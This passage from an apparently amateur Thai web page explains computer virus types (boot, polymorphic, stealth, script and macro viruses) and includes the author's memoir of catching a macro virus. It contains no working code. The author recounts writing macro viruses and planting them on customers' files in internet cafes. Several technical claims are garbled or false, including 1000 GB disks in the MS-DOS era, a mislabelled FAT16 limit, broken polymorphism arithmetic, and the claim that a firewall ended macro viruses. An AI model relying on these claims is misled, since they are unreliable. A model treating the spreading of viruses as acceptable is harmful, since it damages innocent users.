เลขฐานสิบจะมาพูดภายหลัง) แต่ในสมัยนั้น MS-DOS สามารถมีพาร์ทิชั่นแบบ FAT16 หรือพูดง่ายๆ คือ ใช้ค่า 16 Bit ในการระบุขนาดของไดร์ฟต่างๆ สูงสุดคือ 2048 เมกะไบต์ (อันนี้คือค่าฐานสิบหก) แต่ตอนนั้น Hard disk ลูกหนึ่งๆ ความจุปาเข้าไป 1000 กิกะไบต์ (อันนี้คือค่าฐานสิบ) ทำให้ต้องมีการแตกไดร์ฟหรือพาร์ทิชั่นเป็นได้ประมาณ 4 ไดร์ฟ หรือ 4 พาร์ทิชั่น เพื่อให้ MS-DOS มองเห็นเนื้อที่ของฮาร์ดดิสก์ในเต็มลูก และในสมัยนั้นมีระบบปฏิบัติการอื่นๆ เกิดขึ้นทำให้ MS-DOS ต้องสื่อสารกับตารางพาร์ชั่นของระบบปฏิบัติการอื่นๆ ด้วย จึงมีการกำหนดรูปแบบของตารางพาร์ทิชั่นและส่วนของการบูตอัปที่แตกต่างกันออกไป และในส่วนการบูตอัปของตารางพาร์ทิชั่นนี้เอง ที่เป็นที่สิ่งสถิตย์ของ Partition Virus ปัจจุบันเราเรียกส่วนนี้ว่า "บูตโหลดเดอร์; Boot Loader"  ในส่วนของการยึดครอง สมัยก่อนเรียกว่า "การครอบครองแทร็ก" เป็นสาเหตุเดียวที่เวลาติดไวรัสสมัยก่อนต้องทำการล้างพาร์ทิชั่น แต่อย่างลืม ส่วนของพาร์ทิชั่นนี้ เป็นคนละส่วนกับ MBR ไวรัสพาร์ชั้นหัวกระทิจะติดเชื้อ MBR ด้วย เพื่อเป็นหลักประกันว่า ผู้ใช้คอมพิวเตอร์จะไม่สามารถทำลายไวรัสหมดสิ้นได้และจะหลบซ่อนต่อไป จึงมีคำสั่งการล้างพาร์ทิชั่นที่สำคัญในยุค MS-DOS คือ

	FDISK /MBR								
		เพื่อให้ระบบปฏิบัติการ MS-DOS เขียน MBR ใหม่จากค่ามาตราฐานและถ้าไวรัสพวกนี้ฉลาดมันจะติดเชื้อแฟ้ม FDISK.EXE ภายในเครื่องด้วย เป็นอันว่าจะมีการเขียนไวรัสลงไปใหม่ซ้ำๆ จึงเป็นยุคที่แอนตี้ไวรัสต้องทำการตรวจสอบส่วนของ Boot Loader อย่างแรกก่อนทำงานใดๆ ทั้งสิ้น อย่างไรก็ดีมาถึงยุคปัจจุบันเราจะผวกส่วนของไวรัส MBR และ ไวรัสพาร์ทิชั่น ว่าเป็นมัลแวร์ที่เรียกใหม่ว่า "รูทคิท; Root Kit" เพราะการโจมตีในยุคปัจจุบันลูกไม้เดิมๆ ใช้ไม่ได้ผล เลยมีการออกแบบมัลแวร์แบบนี้ให้มีขีดความสามารถผนวกคำสั่ง BIOS ที่เรียกว่า "เฟริมแวร์; Firmware" และให้เชื้อไวรัสเกาะติดแฟ้มระบบปฏิบัติการระดับ "แกนระบบ; Kernel" และเป็นจุดยุทธศาสตร์หลักของแฮกเกอร์มือดี...ที่รู้ว่าแทรกซึมกองบัญชาการฆ่าศึกได้เท่ากับชนะสงครามด้านยุทธวิธี และทุกวันนี้ มัลแวร์ที่มีประสิทธิภาพจะยึดครองส่วนนี้เป็นอันดับแรกในสงครามไซเบอร์ อย่างไรก็ดีเราสามารถตั้งค่า Boot Security ใน BIOS เพื่อให้การแทรกแซงจะไม่เป็นผลเมื่อเผลอเสียบอุปกรณ์ที่มีมัลแวร์ฝังอยู่ แต่นั้นก็ไม่ปลอดภัยพอ จึงมีการกำหนด Boot Loader เสียใหม่ในรูปแบบ "ยูอีเอฟไอ; UEFI" คือเมื่อ BIOS ทำการ "พาวเวอร์ออนเซล์ฟเทส; POST = Power On Self Test" จะตรวจสอบบูตโหลดเดอร์จากค่าโรงงานของ BIOS ว่าถูกต้องหรือไม่ ถ้าส่วนบูตถูกแทรกแซงหรือไม่ถ้าค่า "ซิกแนลเจอร์ ; Signal true" ไม่ถูกต้องจะทำการเขียนบูตโหลดเดอร์ส่วนนี้ใหม่ทับในทันที แต่ก็อย่างว่า...แฮกเกอร์นะปี พ.ศ. 2567 ค้นพบ "ซีโร่เดย์ ; Zero Day" เจาะเฟริมแวร์ในส่วนนี้เรียบร้อยต้องดูกันต่อว่าจะมีความปลอดภัยหรือป้องกันที่แน่นหนามากกว่าอีกหรือไม่ในอนาคต
(อ่านต่อ “ทำความเข้าใจ Boot Virus”)
	2. Programs Virus (ไวรัสที่ทำงานด้วยภาษาแอสแซมบลี)
	ไวรัสที่เจาะเข้าสู่แฟ้มคำสั่ง MS-DOS ยุคแรกและตัวแรกคือ "เยลูซาเลม; Jerusalem" ซึ่งไวรัสรูปแบบนี้คือภาษาเครื่องที่เขียนหรือสำเนาตัวเองไปยังแฟ้มคำสั่งระบบปฏิบัติการได้ ในยุคแรกๆ MS-DOS 6 เป็นต้นมามีคำสั่งตรวจสอบไวรัสประเภทนี้มาคือคำสั่ง MSAV.EXE เพื่อทำการสแกนไวรัสที่ติดเชื้อ "อินเฟค;In face" กับไฟล์ระบบได้ด้วยค่า "ซิกแนลเจอร์ ; Signature" แต่ด้วยความสับเพร่าหรือไงไม่ทราบ แฟ้มที่เก็บค่าซิกแนลเจอร์ไวรัสในแฟ้มข้อมูลจะอยู่ในทุกไดเร็กทอรี่ของ MS-DOS และก็แก้ไขได้โดยไวรัสเพื่อหลอกล่อการตรวจจับไวรัสได้จึงทำให้แอนตี้ไวรัสของ MS-DOS ไร้ประสิทธิภาพโดยสิ้นเชิง
		2.1 Runtime ไวรัสแบบง่ายๆ (รอการเรียกใช้โปรแกรมและทำงานและค้นหาไฟล์ต่อไปเพื่อแพร่เชื้อ) ไวรัสชุดคำสั่งหรือโปรแกรมไวรัสรูปแบบนี้ทำงานด้วยหลักการที่ว่า "เรียกใช้งานมันถึงติดเชื้อไฟล์อื่นๆ" เพื่อไม่ให้ผิดสังเกตไวรัสพวกนี้จะกระทำการแค่ทีละครั้ง เพื่อลดการผิดสังเกตและความเร็วในการติดเชื้อไม่ผิดสังเกตจนเกินไป รูปแบบของแอสเซมบลีโค้ดของ รันไทม์ คือ อาศัยบริการ "ไฟลเฟริส; File First
บริการ 4E อินเตอร์รัพต์ 21" และ "ไฟล์เน็กซ์; File Next บริการ 4F อินเตอร์รัพต์ 21" ตัวขัดอินเตอร์รัพต์ของ MS-DOS" เป็นตัวค้นหาแฟ้มข้อมูลภาพในเครื่อง เพื่อค้นหาว่า ไฟล์ติดเชื้อไปแล้วก็ข้ามไป หากยังไม่ติดเชื้อจะเขียนไวรัสต่อเติมเข้าไปแล้วหยุดการทำงาน
		2.2 Polymorphic ไวรัสที่เข้ารหัสตัวเองเพื่อหลบซ่อนจากแอนตี้ไวรัสหรือหลอกลวงค่า "เช็คซัม; Check Sum" ได้ ไวรัสจำพวกนี้ มันเหมือนกับ "โจรพันหน้า" เพราะหลักการของมันคือการทำให้โค้ดของไวรัสเปลี่ยนไปทุกๆ ครั้งที่มีการติดเชื้อ แต่การเปลี่ยนโค้ดของไวรัสนั้นจะต้องรักษาคุณสมบัติของไวรัสแม่แบบอย่างคบถ้วนเพื่อไม่ให้ไวรัสเกิดการทำงานที่ผิดพลาด
		- ต้นแบบไวรัสคือ 012345678X ซึ่งตัวเลขชุดนี้สมมุติให้เป็นคำสั่งไวรัสทั้งชุดคำสั่ง ตัวเลขในนั้นห้ามผิดเพี้ยนไปแม้แต่ตัวเดียวถ้าผิดจะทำให้ไวรัสทำงานผิดพลาด สุ่ม X = 6 จะกลายพันธ์เป็น (0+6)(1+6)(2+6)(3+6)(4+6)(5+6)(6+6)(7+6)(8+6)(X=6) = 6789012346 (ทำไม 4+6เป็น 10 และทำไมในตัวอย่างเป็น 0 เพราะ คอมพิวเตอร์จะตัดเลขตัวแรกออกให้ได้ค่าของ XOR ทางคณิตศาสตร์)
		- เมื่อไวรัสติดเชื้อแฟ้มเป้าหมายจะทำการถอดรหัสของตัวเองจาก 6789012346 X = 6 (X คือค่าที่ถูกสุ่มขึ้นมาเก็บเอาไว้ในตัวสุดท้าย)" กลายเป็น (6-6)(7-6)(8-6)(9-6)(0-6)(1-6)(2-6)(3-6)(4-6)(X-6) เป็น 0123456789X อีกครั้งเพื่อเรียกคำสั่งไวรัสทำงาน...จากนั้นจะทำการสุ่ม X ขึ้นมาใหม่และกลายพันธ์เป็นเลขตัวอื่นต่อไป...ดังนี้
		- เมื่อไวรัสในข้อ 2 ต้องการแพร่เชื้อไปยังแฟ้มเป้าหมายอีกครั้ง X = 3 (สุ่มมาใหม่) จะกลายพันธ์เป็น (0+3)(1+3)(2+3)(3+3)(4+3)(5+3)(6+3)(7+3)(8+3)(X=3) = 3456789013 ซึ่ง 34567893 จะไม่มีความเหมือน 6789012346 แม้แต่นิดเดียว....ทำให้โปรแกรมฆ่าไวรัส...สแกนข้อความที่ซ้ำกันไม่เจอ...(ยกเว้น...จะหาโค้ดสำคัญที่ใช้ในการเข้ารหัสในนั้นได้...หรือที่เรียกว่า "อัลกอลิทึม" เจอ...จึงสแกนฆ่ามันได้ทุกตัว) ไม่จำเป็นเสมอไปครับที่อัลกอลิทึมของคณิตศาสตร์หรือสมการเข้ารหัสจะต้องเป็นตัวเดียวกันหรือ ใช้คำสั่ง "จูเลียสซีซาร์; Julius Caesar" ตามตัวอย่างที่กล่าวมา แต่การคำนวนเข้ารหัสในคอมพิวเตอร์ ภาษาใดๆ ก็ตาม นิยมใช้คำสั่ง (Excursive OR; XOR) เพื่อทำการเข้ารหัส ซึ่งรูปแบบของคำสั่งคล้ายๆ การคำนวณที่ผ่านมาเพียงแต่อยู่บนพื้นฐานของตรรกะวิทยาซึ่งไม่มีนิยามที่ยุ่งยาก

0 XOR 0 = 0
0 XOR 1 = 1
1 XOR 0 = 1
1 XOR 1 = 0

ตรรกะนิยามคือ "เลขต่างกันให้เป็น 1"

VIRUS XOR RANDOM = KEY
และย้อนกับเป็น
KEY XOR RANDOM = VIRUS

สมมุติไวรัสมี 1 บิต

1 XOR 1 = 0
และย้อนกับเป็น
0 XOR 1 = 1

สมมุติไวรัสมี 4 บิต

1011 XOR 1110 = 0101
และย้อนกับเป็น
0101 XOR 1110 = 1011

		2.3 Stealth  ไวรัสที่เปลี่ยนตาราง MS-DOS หรือ ฮุคอินเตอร์รัพต์และเคลื่อนย้ายการอ่านไวรัสไปยังตำแหน่งอื่นได้ไวรัสชนิดนี้เราจะเรียกมันว่า "ไวรัสหลอกล่อดีบัก หรือ ไวรัสฝั่งตัว (TSR; Terminate Stay Resident)" ซึ่งจะเป็นไวรัสชั้นสูงเป็นส่วนใหญ่ ซึ่งการทำงานของไวรัสพวกนี้ ต้องอาศัยการ "รันไทม์" ในระบบปฏิบัติการเสียก่อน เช่นฝั่งตัวคำสั่งไวรัสใน COMMAND.COM เพื่อให้คำสั่งไวรัสฝั่งอยู่ในระบบเพื่อรอดักจับแฟ้ม .COM หรือ .EXE แฟ้มอื่น จากนั้นจะฝั่งคำสั่งล่องหนในหน่วยความ เพื่อไม่ให้โปรแกรมฆ่าไวรัสหรือผู้ใช้ระบบมองเห็นพวกมัน เช่น
		ถ้าระบบมีการตรวจสอบว่าแฟ้ม COMMAND.COM มีขนาดเป็นเท่าไร ไวรัสจะทำการหลอกระบบด้วยการแจ้งข้อมูลที่เป็น "เท็จ" เพื่อไม่ให้ระบบผิดสังเกตว่า COMMAND.COM มีขนาดเพิ่มขึ้น
		ถ้าระบบตรวจสอบแฟ้ม COMMAND.BAK ซึ่งเป็นแฟ้มที่ระบบสำรองเอาไว้ เพื่อดูว่า COMMAND.COM ตัวเดิมมีขนาดเท่าไร ไวรัสก็จะตรวจสอบว่าแฟ้ม COMMAND.BAK นั้นติดเชื้อไวรัสหรือยัง ถ้ายังไม่ติดเชื้อก็จะแทรกคำสั่งไวรัสลงไปทันที และก็ทำการแจ้งขนาดที่เป็น "เท็จ" เช่นเดิมเพื่อไม่ให้ระบบตรวจสอบได้
		ถ้าโปรแกรมฆ่าไวรัสทำการค้นไวรัสโดยดูว่าแฟ้มคำสั่งมีขนาดที่เปลี่ยนไปหรือไม่ หรือทำการสแกนค้นหาข้อความที่น่าจะเป็นไวรัส ไวรัสจะทำการย้ายหัวอ่านในตำแหน่งที่เป็นข้อมูลไวรัสไปยังตำแหน่งอื่น จากนั้นก็ย้ายหัวอ่านกลับมาที่แฟ้มเดิมในตำแหน่งที่ไม่ติดไวรัส ทำให้โปรแกรมฆ่าไวรัสหาไวรัสไม่เจอ แต่ไวรัสคอมพิวเตอร์ส่วนใหญ่ไม่ฉลาดนัก เพราะ แฟ้มคำสั่งสแกนไวรัสสมมุติเป็น NOD55.EXE ไวรัสจะตรวจสอบว่าโปรแกรมฆ่าไวรัสติดไวรัสหรือยัง ถ้ายังก็จะแพร่คำสั่งไวรัสลงไปในโปรแกรมสแกนไวรัสทันที ( โปรแกรมฆ่าไวรัสจึงกลายเป็นตัวแพร่เชื่อไวรัสทันทีถ้าไม่มีการอัปเดรตไวรัส) แต่ถ้าโปรแกรมฆ่าไวรัสที่ติดเชื้อไวรัสอยู่มีการ "อัปโหลด" กลับไปยังศูนย์วิจัยจะถูกตรวจสอบขนาดแบบ (Check Sum) เป็นผลให้พบไวรัสทันที เพราะว่าคำสั่งไวรัสไม่สามารถหลอกล่อดีบักเกอร์ในเครื่องที่ยังไม่ติดเชื้อไวรัสนั้นเอง เห็นไหม? ผู้ร้ายต้องตายตอนจบอยู่แล้วโดยสรุปคือ...ไวรัสจำพวก "เครื่องบินรบ" หรือ "สเติลช์" นั้นเป็นไวรัสที่ความสามารถสูงอย่างมากและต้องใช้ความสามารถในการสร้างมันพอสมควร อย่างที่กล่าวไว้แล้ว ไวรัสจำพวกนี้ถูกสร้างจาก "ภาษาระดับต่ำ" แต่เป็น "ไวรัสชั้นสูง" เพราะรูปแบบคำสั่งอันซับซ้อนของภาษา "แอสเซมบลี (Assembly)" ซึ่งน้อยคนในสมัยนี้จะรู้จักและเขียนภาษาระดับต่ำเหล่านี้ได้ ก็นับว่าดีอยู่บ้าง เพราะว่าไวรัสจำพวกนี้ในปัจจุบันหายากมากๆ เพราะระบบปฏิบัติการวินโดวส์นั้นทำงานแบบ "มัลติโปรแกรมมิ่ง ; Multiprogramming" การจองหน่วยความจำเพื่อฝั่งคำสั่งหลอกล่อนั้นไม่สามารถทำได้ง่ายๆ และก็โชคดีที่การจองการทำงานในหน่วยความจำของวินโดวส์ต้องอาศัย "Task Process" เท่านั้น เราจึงสามารถตรวจสอบได้ว่ามีอะไรแปลกปลอมในหน่วยความจำในเครื่องของเราเอง
		2.4 Multi plate ไวรัสที่สามารถติดเชื้อใน Script หรือ Document ได้ "ไวรัสกลายพันธ์" หรือ "หลากหลายสายพันธ์" มัลติเพลตไวรัสเป็นไวรัสจำพวกหนึ่งที่มีความสามารถทางภาษา คือ ในไวรัสตัวเดียวนั้นอาจประกอบไปด้วยภาษาคอมพิวเตอร์มากกว่า หนึ่งภาษา เพื่อให้ไวรัสสามารถกระจายเชื้อไปได้อย่างกว้างขวาง ซึ่งในภาษาคอมพิวเตอร์ภาษาใดก็ตามที่เขียนอยู่ในไวรัส สามารถแพร่กระจายตัวเองไปยัง "แพลตฟอร์ม ; Part form" เดียวกันได้และยังมีความสามารถแพร่เชื้อไปยังแพลตฟอร์มอื่นๆ ได้ด้วย บางตัวสามารถกระจายไปยัง Binary Code หรือภาษาระดับต่ำเพื่อติดเชื้อแฟ้มระบบ .EXE หรือ .COM ได้ โดยตัวไวรัสจะบรรจุคำสั่ง Binary Code เก็บเอาไว้ในตัวของมันซึ่งบางครั้งเป็น "เทกซ์ ; Text" หรือ "ข้อความ" ทั่วไป ผ่านการประมวลผลและคัดลอกทั้งชุดคำสั่งไวรัสไปเก็บเอาไว้ในเป้าหมายทุกๆ คำสั่ง แม้ว่าจะไม่ใช่ภาษาที่ฟอร์มนั้นก็ตาม (ดูเรื่องภาษาคอมพิวเตอร์ จะแยกแพลตฟอร์ออกเป็น แต่ละระดับ)
(อ่านต่อ “ทำความเข้าใจ Program Virus”)

	3. Script Virus (ไวรัสที่เข้าถึงแฟ้มสคริปของวินโดวส์ทั้ง Registry หรือ Java Script หรือ VB Script หรือ Batch File และ Power shell Script)
	ไวรัสชนิดนี้ โดยทั่วๆ ไปจะพบเป็นหนอนคอมพิวเตอร์เสียส่วนใหญ่ในปัจจุบัน คือการอาศัยแฟ้ม Autorun.INF เพื่อเรียกพวกมันทำงานเมื่อเสียบอุปกรณ์เก็บข้อมูลแบบ Removable นั้นเอง การทำงานของไวรัสสคริปหรือหนอนจำพวกสคริป จะอาศัยประโยชน์จากคำสั่งของระบบปฏิบัติการเป็นคำสั่งอำนวยการแพร่เชื้อไวรัส แม่แต่ “เวปเพจ” เองก็พบไวรัสจำพวกนี้เหมือนกัน เพราะแฟ้ม .HTM หรือ .HTML จะอาศัยภาษา “วิชวลเบสิคสคริป” และ “จาวาสคริป” เป็นคำสั่งเสริมการทำงานเพื่อให้เวปเพจสามารถทำงานที่สลับซับซ้อนได้ ซึ่งในชุดคำสั่งเหล่านั้นเป็นเพียง “Text และ ข้อความธรรมดา” จึงทำให้คำสั่งที่เป็นข้อความถูกเคลื่อนย้ายและจำลองชุดข้อความนั้นไปยังแฟ้มอื่นๆ ได้ ไม่แปลกเลยที่เวปไซด์เอง จะเป็นช่องทางในการแพร่ไวรัสช่องทางหนึ่งที่มีความสกปรกอย่างมาก แต่ระบบปฏบัติการ Windows XP นั้นไปทำการอุดช่องว่างเหล่านั้นโดยการเพิ่มความปลอดภัยที่เรียกว่า “Fire Wall ; ไฟล์วอลล์” เพื่อปิดกั้นช่องทางของไวรัสและแฮกเกอร์มือใหม่
(อ่านต่อ “อ่านต่อทำความเข้าใจ Script Virus”)

	4. Document Virus (ไวรัสที่เข้าถึง Macro หรือ VBA หรือ Action Script หรือ Type Script)
	- Office Macro virus (ไวรัสที่อาศัยคำสั่ง Visual Basic for Application ในการทำงาน เช่น Word, Excel, Power Point) ในปัจจุบันนี้ ผู้ที่อยู่สำนักงานหรือองค์กรต่างๆ ที่ต้องอาศัย MS-Office เป็นโปรแกรมสร้างงานเอกสารและนำเสนอก็นับว่าโชคดีครับ หลังจากวินโดวส์ XP ทำการติดตั้ง File Wall เพิ่มเข้ามา ไวรัสจำพวกนี้เริ่มสูญหายไปกับการถูกปฏิเสธการใช้คำสั่ง การที่คุณจะป้องกันไวรัสจำพวกนี้คือต้องติดตั้งโปรแกรมฆ่าไวรัสรุ่นใหม่ เพื่อป้องกันคำสั่ง "มาโคร" ซึ่งเป็นภาษา "VBA ; Visual Basic for Application" ของตัวโปรแกรม ซึ่งเดิมทีผู้จัดทำโปรแกรมหวังให้ภาษานี้ช่วยสนับสนุนการทำงานที่ยากๆ ของเอกสารสำนักงานให้ง่ายลงมาและมีประสิทธิภาพเท่าเทียมกับโปรแกรม แต่เพราะความสามารถของภาษา "มาโคร" นี้เองที่ผู้สร้างไวรัสหันไปศึกษาและหาช่องทางในการเล่นงานคนอื่นผ่านเอกสารเพียงฉบับเดียว สามารถแตกกระจายไปทั่วโลกได้อย่างน่ากลัว หนึ่งในไวรัสมาโครที่ประสบความสำเร็จด้านเลวร้ายคือ "เมลิซ่า Melisa" ในประเทศอเมริกา ซึ่งภายในชั่วข้ามคืน ไวรัสของเขาทำให้เครื่องนับ แสนเครื่องติดเชื้อและติดเชื้อแบบข้ามทวีปเลยทีเดียว ผมจึงอยากให้ทำความเข้าใจการทำงานของไวรัสจำพวกนี้ให้ดีและจะแนะนำว่า คุณมีโอกาศเพียงครั้งเดียวเท่านั้นในการคลิ๊ก ถ้าคุณเลือกตอบว่า "ใช้แมโคร" ก็เป็นอันว่า "ไวรัสจะซ่อนหน้าต่างนี้ไปจนกว่ามันจะตาย และเครื่องของคุณก็กลายเป็นทาสของมันทันที" เมื่อไวรัสสิงสถิตอยู่ในเครื่องของคุณแล้วคุณก็ไม่สามารถจะหยุดการทำงานของมันได้โดยง่าย เช่น ถ้าคุณคิดจะไปกำจัดพวกมันใน Visual Basic Editor คุณไม่สามารถกำจัดมันด้วยวิธีธรรมดาแน่นอน เพราะไวรัสพวกนี้แม้ว่าคุณจะลบแฟ้มที่ติดไวรัสไปแล้วแต่มันยังฝังอยู่ในระบบของคุณอยู่ วิธีที่จะกำจัดหลายๆ คน ลงโปรแกรมใหม่ และลบแฟ้มติดไวรัสทิ้งให้หมด...นั่นก็เป็นทางแก้ปัญหาอีกทางหนึ่ง แต่คุณคงต้องทำอย่างนั้นบ่อยๆ ถ้ารับเอกสารจากลูกค้าหรือเพื่อนในสำนักงานที่ติดไวรัสอยู่ วงจรนี้ก็จะกลับมาอีก
	- Portable Document Format หรือ PDF Virus (ไวรัสที่อาศัยคำสั่ง Type Script ในการแพร่เชื้อ)
(อ่านต่อ “ทำความเข้าใจ Document Virus”)
					</pre>
					<br><a href=#main>กลับสู่หน้าหลัก</a>
				</td>
			</tr>
		</table>
	</center>
	<br>
	<center>
		<table>
			<tr>
				<td>
 					<h1 id='Menu9'>
08. ทำความเข้าใจไวรัส Batch File
					</h1>
				</td>
			</tr>
			<tr>
				<td>
					<pre>
	ในแง่ความเป็นจริงแล้ว...ไม่มีใครชอบไวรัสคอมพิวเตอร์...แต่พอใครบางคนเริ่มรู้ว่าตนเองสามารถเขียนมันขึ้นมาได้...หรือแกล้งคนอื่นๆ ได้...ความชั่วร้ายในใจ...กลายเป็น พลังผลักดันให้คนเหล่านั้น...เขียนมันซ้ำอีก...พัฒนามันซ้ำอีก...จนกลายเป็น "เด็กร้อนวิชา"แต่ในโลกยุคปัจจุบัน...การเขียนไวรัสเป็นเรื่องผิดกฎหมาย...ทำให้ใครหลายคน... มองว่ามันเป็นเรื่องไม่ดี...ไม่เหมาะ...(ก็จริง) แต่ในด้านการศึกษาแล้ว...มันถูกมองข้ามความสำคัญของการป้องกันตัวเอง...รู้เท่าทัน...คำสั่งที่มีชีวิต...อาศัยเพียงไม่กีตัวอักษร... ในการคัดลอกตัวคำสั่งของมันไปเรื่อย...องค์ความรู้เหล่านี้...อยู่แต่ห้องใต้ดิน...และเวปมืดและยิ่งเป็นคำสั่ง Batch File ที่สามารถเขียนมันบน Notepad มันยิ่งทำให้คนรุ่นใหม่...มองหาอะไรที่ง่ายๆ เขียนเพียงไม่กี่ตัวอักษร หรือคัดลอกไป...มันก็ทำให้คนเหล่านั้นประหลาดใจได้ เรียกเด็กพวกนี้ว่า "เกรียนแอฟ" มักจะลองของ... แกล้งเพื่อน...โดยกฎหมายยังมองเห็นเป็นเรื่องเล็กๆ ที่พอจะรับได้...แต่ถ้าเมื่อใดเป็นการ "แฮกเวป" "ดักฟัง" "ทำลายข้อมูล" เรื่องเล็กที่เด็กบางคน...ไม่รู้...ก็จะเป็น "งานเข้า" สำหรับเด็กเหล่านั้น...ฉนั้นการศึกษาคำสั่งบางคำสั่ง...น้องๆ ต้องรู้ว่า...มันทำง่านอย่างไร...ทำเพื่ออะไร...และมีผลอย่างไร
	เนื่องด้วยติดตามดูผลงานตัวเอง...จากหลายๆ บล็อกพบว่า...เนื้อหาเกี่ยวกับไวรัสเป็นที่สนใจของเด็กร้อนวิชา...ที่อยากจะสร้างไวรัสคอมพิวเตอร์ขึ้นมาแกล้งเพื่อน และมียอดวิวที่สูง...เลยสนองความต้องการของเด็กเหล่านี้ซะ...555 ไม่ได้หมายความว่า "พี่แมวตาเดียว" จะสอนเขียนไวรัสนะ...แต่วันนี้เราจะมาเขียนตัวฆ่าไวรัสกัน อย่างไรก็ดี...เด็กรุ่นใหม่ที่เขียนโปรแกรมไม่เป็นเยอะมากและก็ไม่คิดจะเขียนให้เป็นด้วย...ขอแค่ คัดลอกอะไรก็ได้ลง Notepad และก็เอาไปแกล้งเพื่อน...โถ่...เด็ก...
	ท้าวความ...เมื่อก่อนตอนได้คอมพิวเตอร์เครื่องแรกมาใหม่ๆ ผมเองโดนไวรัสคอมพิวเตอร์เล่นงานซะ...อ่วม...กับค่าลงโปรแกรมและซ่อมวินโดวส์ และไวรัสสมัยนั้น...โคตะระ...ห่า...ฆ่าอยากฉิบ...ไวรัสในสมัย DOS นั้นไม่มีรูปแบบเป็น Pain text แบบสมัยนี้นะครับ...มันเป็น Binary ล้วนๆ อ่านไม่ออกหลอกว่ามันทำงานอย่างไร...หรือกล่าวได้ว่ามันเป็น Assembly Code หรือ ภาษาเครื่อง คุณไม่มีทางรู้เลยว่ามันคืออะไรมีอันตรายไหม...และเกาะติดแฟ้ม .EXE, .COM ได้อย่างไร ด้วยความแค้นและผสมความเจ็บใจจึงเริ่มศึกษาอย่างจริงๆ จังๆ ว่ามันทำงานอย่างไร...ในยุคนั้น Internet ไม่มีฐานความรู้ภาษาไทยให้มากขนาดนี้...ต้องเปิดตำราศึกษา Assembly และ C และระบบปฏิบัติการ DOS จึงพอทำความเข้าใจได้คร่าวๆ ว่า ไวรัสนั้นทำงานด้วยการอาศัยติดแฟ้มคำสั่งไม่ว่าจะเป็น .EXE, .COM, .DLL, .OVL, .BIN, .SYS ก็ตามโดยมันจะมองที่ส่วนหัวของนามสกุลดังกว่าว่าเป็น MZ หรือเปล่า ถ้าไม่เป็น มันจะเปลี่ยนเป็น ZM เพื่อบอกว่ามันติดเชื้อแล้ว ซึ่งเจ้า MZ หรือ 2 Byte แรกของไฟล์คำสั่งนั้นเป็น ซิกแนลเจอร์ ของแฟ้มคำสั่งบน Windows และ DOS ไม่รู้ว่ามันย่อมาจากคำว่า Machine Zip หรือเปล่า เดาเอา
	พอเริ่มเข้าใจว่าไวรัสทำงานอย่างไรมีกี่ประเภท...และหลบซ่อนตัวอย่างไร...จึงเริ่มเป็นนักฆ่าไวรัสแหละ...แต่พอมาถึงยุคไวรัสมาโคร...ก็เริ่มอยากศึกษาไวรัสมาโครมันทำงานอย่างไร...โดยไวรัสมาโครที่เขียนตัวแรก...ได้มาจากการลองดักจับไวรัสดังนี้
	1. คัดลอกเอกสารเวิร์ดที่ติดเชื้อมาใส่ ฟล็อปปี้ดิสก์
	2. เสียบในเครื่องไม่ติดเชื้อ
	3. เปิดไฟล์เวิร์ดที่ติดเชื้อเพื่อดักจับ
	4. เพื่อไม่ให้ไวรัสทำงานได้สมบรูณ์ เลยถอดฟล็อปปี้ดิสก์ซะ...เพื่อให้ไวรัสติดกับดัก...(ได้ผล...) ไวรัสรันคำสั่งไปได้ครึ่งทางก่อนทำการซ่อนตัวอย่างถาวร...เกิด Error ในสคริปมาโครไวรัส ทำให้ Visual Basic for Application แสดงบรรทัด Error ของไวรัสมาโคร
	5. 555 หวานหมู...ไม่นึกมาก่อนว่าไวรัสมาโครที่หาตัวยากสมัยนั้น...ถูกดักจับด้วยวิธีพื้นๆ จากนั้นคัดลอกโค้ดใส่ Notepad เพราะรู้ว่าไวรัสไม่มีทางรันบน Notepad ได้
	6. พึ่งมารู้ที่หลังว่า...ดักจับไวรัสที่หลบซ่อนตัวดีที่สุดในโลกตัวหนึ่งชื่อ Bablas.W32 Macro จากนั้นเป็นต้นมาศึกษามาโครอย่างจริงจังเพื่อเขียนไวรัสมาโครเผยแพร่ และเสียบมันในร้านเน็ต...ร้านพิมพ์งานเอกสาร...รวมถึงลูกค้าที่ชอบมาเซฟงานที่ร้านก็จะได้มันกลับไป
	พอมาถึงยุคไวรัสที่ทำงานบน Hypertext ไวรัสพวกนั้น...ผมไม่มีโอกาสได้ศึกษามันเพราะติดงานประจำ และยุคแห่งความเป็นเด็กคึกคะนองก็หมดไปพร้อมๆ กับรู้ตัวว่าทำผิด แต่ยังชอบศึกษาด้านความปลอดภัยระบบกับไวรัสอย่างเสมอ มายุคที่วินโดวส์ XP ออกตลาดใหม่ๆ Hypertext ไวรัสหมดไป...ก็เริ่มหันมาเขียนตัวป้องกันไวรัสที่บล็อก AutoRun หรือ สแกนมาโครไวรัส...ซึ่งเป็นเพียงอดีต...จึงไม่รุ่ง

ทำไมไม่เขียนไวรัสแพร่กระจายต่อ
	1. ผิดกฎหมาย
	2. นักฆ่าซอมบี้...ต้องเก่งกว่าซอมบี้อยู่แล้ว (เปลี่ยนข้าง)
	3. ไม่เล่งเห็นประโยชน์
	4. เขียนเป็นตั้งแต่ Binary Virus จนถึง สคริปไวรัส แต่ Antivirus เอาไปกินหมด
	5. เพราะไม่มีผู้สร้าง Antivirus คนใด...เขียนไวรัสของตัวเองให้ Antivirus ยี้ห้ออื่นฆ่าแทน

คำถามค้างคาใจหลายๆ คน
	1. ผู้เขียนแอนตี้ไวรัส...เป็นผู้ปล่อยไวรัสเองใช่หรือไม่...ผมจะย้อนถามเขาเหล่านั้นว่า...ผู้ผลิตอาวุธนิวเครียร์...จะนำอาวุธนั้นมาบอมประเทศตัวเองใช่หรือไม่และถ้าจะโง่บอมประเทศตัวเอง...จะรบกับประเทศอื่นที่มีนิวเครียร์อย่างไร...
